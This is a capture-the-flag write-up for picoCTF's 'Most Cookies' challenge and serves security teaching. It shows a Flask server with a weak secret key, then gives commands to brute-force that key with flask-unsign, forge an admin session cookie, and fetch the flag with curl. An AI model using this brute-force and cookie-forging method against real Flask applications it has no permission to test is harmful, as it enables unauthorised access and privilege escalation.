# Most Cookies

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 150
Tags: picoCTF 2021, Web Exploitation
Author: MADSTACKS
 
Description:
Alright, enough of using my own encryption. 
Flask session cookies should be plenty secure! 

server.py 
http://mercury.picoctf.net:18835/

Hints:
1. How secure is a flask cookie?
```
Challenge link: [https://play.picoctf.org/practice/challenge/177](https://play.picoctf.org/practice/challenge/177)

## Solution
 
According to the challenge description we should expect a flask session cookie. This cookie is normally called `session`.

### Analyse the source code

Let's start by analysing the server source code
```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```

We can see that the secret key is chosen randomly from one of the cookie names
```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```

And we want the `very_auth` value to be set to `admin` to get the flag
```python
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
```

### Create a cookie wordlist

To get the secret key we need to create a wordlist with all the cookie names.  
We use some command-line kung-fu to do this
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Most_Cookies]
└─$ cat server.py | grep cookie_names | head -n 1 | cut -d '[' -f 2 | sed 's/", "/\n/g' | tr -d '"]'
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Most_Cookies]
└─$ cat server.py | grep cookie_names | head -n 1 | cut -d '[' -f 2 | sed 's/", "/\n/g' | tr -d '"]' > cookies_wordlist.txt

```

### Get the secret key

We will use the [flask-unsign tool](https://pypi.org/project/flask-unsign/) to get the secret key
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Most_Cookies]
└─$ ~/python_venvs/flask-unsign/bin/flask-unsign --unsign --server 'http://mercury.picoctf.net:18835/' --wordlist cookies_wordlist.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZSv2EQ.LJQ2BhAgtiyRAhfIe8WV6U12bmc
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

So the secret key is `fortune`.

### Forge a flask session cookie

Now we can forge a flask session cookie with the value of `admin`
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Most_Cookies]
└─$ ~/python_venvs/flask-unsign/bin/flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret fortune               
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZSv3cQ.7JuXHXOl4eRVjuxwC-TyLsKtTJk
```

### Get the flag

Finally we can use `curl` and `grep` to get the flag
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Most_Cookies]
└─$ curl -s --cookie "session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZSv3cQ.7JuXHXOl4eRVjuxwC-TyLsKtTJk" http://mercury.picoctf.net:18835/display | grep -oE 'picoCTF{.*}'
picoCTF{<REDACTED>}
```

For additional information, please see the references below.

## References

- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cut - Linux manual page](https://man7.org/linux/man-pages/man1/cut.1.html)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [sed - Linux manual page](https://man7.org/linux/man-pages/man1/sed.1.html)
- [tr - Linux manual page](https://man7.org/linux/man-pages/man1/tr.1.html)
- [PyPI - flask-unsign](https://pypi.org/project/flask-unsign/)
- [Wikipedia - HTTP cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
